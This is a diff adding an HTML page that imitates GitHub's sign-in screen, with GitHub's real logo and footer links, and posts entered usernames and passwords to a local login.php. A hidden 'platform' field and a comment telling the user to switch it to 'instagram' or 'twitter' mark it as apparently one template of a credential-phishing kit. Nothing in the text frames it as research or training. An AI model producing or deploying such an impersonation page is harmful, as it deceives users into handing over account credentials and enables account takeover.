@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub Logo" class="logo">
+            <h2>Sign in to GitHub</h2>
+            <form action="login.php" method="POST">
+                <input type="hidden" name="platform" value="wordpress"> <!-- Change to "instagram" or "twitter" as needed -->
+                <div class="input-group">
+                    <label for="username">Username or email address</label>
+                    <input type="text" name="username" id="username" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" name="password" id="password" required>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+                <button type="submit" class="login-btn">Sign in</button>
+            </form>
+            <p class="signup-text">New to GitHub? <a href="#">Create an account</a>.</p>
+        </div>
+        <footer>
+            <ul>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Security</a></li>
+                <li><a href="#">Contact GitHub</a></li>
+            </ul>
+        </footer>
+    </div>
+</body>
+</html>
